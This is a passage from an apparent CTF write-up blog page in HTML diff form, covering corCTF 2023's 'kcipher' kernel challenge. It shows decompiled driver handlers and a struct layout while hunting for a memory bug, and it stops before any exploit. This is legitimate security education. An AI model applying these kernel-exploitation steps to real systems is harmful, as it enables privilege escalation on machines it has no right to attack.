@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>corCTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="corCTF 2023" />
+<meta property="og:description" content="Writeup for corCTF 2023" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/corctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-12T09:00:01+07:00" />
+<meta property="article:modified_time" content="2023-07-31T09:30:18+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
+
+<meta name="twitter:title" content="corCTF 2023"/>
+<meta name="twitter:description" content="Writeup for corCTF 2023"/>
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/corctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/seetf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "corCTF 2023",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/corctf-2023\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, corCTF, pwn, kernel, uaf, 2023","wordcount":  3026 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/corctf-2023\/","datePublished": "2023-06-12T09:00:01+07:00","dateModified": "2023-07-31T09:30:18+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">corCTF 2023</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jun 12, 2023">Jun 12, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3026 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;15 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#kcipher">kcipher</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#solution">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#blockchain">Blockchain</a>
+      <ul>
+        <li><a href="#baby-wallet">baby-wallet</a>
+          <ul>
+            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
+            <li><a href="#solution-1">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/MBlUafg.png" title="https://i.imgur.com/MBlUafg.png" data-thumbnail="https://i.imgur.com/MBlUafg.png" data-sub-html="<h2>corCTF 2023</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/MBlUafg.png"
+            data-srcset="https://i.imgur.com/MBlUafg.png, https://i.imgur.com/MBlUafg.png 1.5x, https://i.imgur.com/MBlUafg.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/MBlUafg.png" />
+    </a><figcaption class="image-caption">corCTF 2023</figcaption>
+    </figure>
+<p>Last weekend, I played with the <strong>Water Paddler</strong> team in the corCTF 2023. We managed to secure the <strong>first place</strong>. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during the corCTF 2023!</p>
+<figure><a class="lightgallery" href="https://i.imgur.com/oZAj8BP.png" title="https://i.imgur.com/oZAj8BP.png" data-thumbnail="https://i.imgur.com/oZAj8BP.png" data-sub-html="<h2>We secured the first place</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/oZAj8BP.png"
+            data-srcset="https://i.imgur.com/oZAj8BP.png, https://i.imgur.com/oZAj8BP.png 1.5x, https://i.imgur.com/oZAj8BP.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/oZAj8BP.png" />
+    </a><figcaption class="image-caption">We secured the first place</figcaption>
+    </figure>
+<p>Below is the writeup for the kernel pwn challenge called <code>kcipher</code> and blockchain challenge called <code>baby-wallet</code>.</p>
+<h1 id="pwn">Pwn</h1>
+<h2 id="kcipher">kcipher</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>lightning fast super-secure and cryptographically safe(?) ciphering in kernel space</p>
+<p>connect with ssh: ssh <a href="mailto:kcipher@i.be.ax" rel="">kcipher@i.be.ax</a></p>
+<p>upload a file to <code>/tmp/exploit</code>: <code>ssh -t kcipher@i.be.ax connect $(cat exploit | ssh i.be.ax upload)</code></p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>After unpacking the provided <code>initramfs.cpio.gz</code>, we noticed a driver named <code>kcipher.ko</code>. Let&rsquo;s attempt to disassemble it first. Below are some notable functions.</p>
+<p><strong>device_ioctl</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">device_ioctl</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r13d
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rsi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">!=</span> <span class="mh">0xEDBEEF00</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">22LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">kmalloc_trace</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0x400DC0LL</span><span class="p">,</span> <span class="mh">0x60LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">12LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">anon_inode_getfd</span><span class="p">(</span><span class="s">&#34;kcipher-buf&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kcipher_cipher_fops</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="nf">copy_from_user</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v8</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v9</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strncpy</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ciphers</span> <span class="o">+</span> <span class="n">v9</span><span class="p">),</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="o">-</span><span class="mi">22LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">kfree</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kcipher_cipher_fops</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The above function is the <code>ioctl</code> handler. When we call <code>ioctl</code> on the driver, it will:</p>
+<ul>
+<li>Allocate a new chunk.</li>
+<li>Open a new file descriptor called <code>kcipher-buf</code>, which has its own <code>fops</code>. The newly allocated chunk will be used as the private data of the new file descriptor.</li>
+<li>Copy 8 bytes from the given userspace address (the <code>ioctl</code> third param). We will learn later that these 8 bytes are actually:
+<ul>
+<li>The first 4 bytes represent the <code>cipher_mode</code>.</li>
+<li>The final 4 bytes represent the <code>cipher_key</code>.</li>
+</ul>
+</li>
+</ul>
+<p>Initially, we didn&rsquo;t see any bugs in this section. However, it turns out there is a bug, which will be explained later.</p>
+<p><strong>cipher_write</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">cipher_write</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">cipher_struct</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// r15
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// rdi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// r13
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">text_chunk</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">cipher_struct</span> <span class="o">**</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mh">0xC0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">12LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">raw_spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v3</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">text_chunk</span> <span class="o">=</span> <span class="nf">_kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mh">0xCC0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">text_chunk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">text_chunk</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">raw_spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">12LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="nf">strncpy_from_user</span><span class="p">(</span><span class="n">text_chunk</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">raw_spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the <code>write</code> handler of the <code>kcipher-buf</code> device. For context, we have created a helper struct called <code>cipher_struct</code>. This struct is the expected format of the <code>private_data</code> that was previously allocated during the initialization of the file via <code>device_ioctl</code>.</p>
+<p>The rough struct looks like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cipher_struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">cipher_mode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">cipher_key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">spinlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function will:</p>
+<ul>
+<li>Allocate a new chunk with <code>kmalloc</code> with our input size.</li>
+<li>Put the chunk address to the file <code>cipher_struct-&gt;text</code>.</li>
+<li>Put the input size as <code>cipher_stuct-&gt;size</code>.</li>
+<li>Copy the string that we send from userspace address to the text chunk with <code>strncpy</code>.
+<ul>
+<li>This means that our copied string won&rsquo;t be allowed to have null bytes because the <code>strncpy</code> will stop on it.</li>
+</ul>
+</li>
+</ul>
+<p><strong>cipher_read</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">cipher_read</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">cipher_struct</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// r15
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">cipher_struct</span> <span class="o">**</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mh">0xC0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">raw_spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">text</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">do_encode</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">size</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size</span> <span class="o">=</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x7FFFFFFF</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">raw_spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2LL</span><span class="p">;</span>
